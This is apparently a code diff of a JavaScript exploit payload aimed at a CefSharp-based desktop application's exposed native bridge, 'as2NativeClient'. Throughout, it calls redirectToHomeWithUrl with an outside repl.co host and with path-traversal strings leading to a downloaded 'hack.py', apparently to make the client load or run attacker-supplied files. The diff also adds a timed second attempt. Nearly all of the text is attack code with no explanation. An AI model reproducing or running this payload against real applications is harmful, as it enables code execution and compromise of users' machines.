@@ -4,12 +4,12 @@
           if(window.as2NativeClient) {
                   
   
-                   window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/");                 
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
+                   window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/1");                 
+                 /* window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
                    window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
                   window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
                   window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
+                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")*/
 
                    //setTimeout('window.as2NativeClient.redirectToHomeWithUrl("..\\\\..\\\\..\\\\..\\\\Downloads\\\\hack.py");alert();',3000)   
                  
@@ -26,3 +26,22 @@
          }
         })
 
+setTimeout(`
+
+        window.CefSharp.BindObjectAsync("as2NativeClient")
+        .then((result) => {
+          if(window.as2NativeClient) {
+                  
+  
+                   window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/2");                 
+                 /* window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
+                   window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
+                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
+                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
+                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")*/
+
+
+         }
+        })
+
+`,3000)
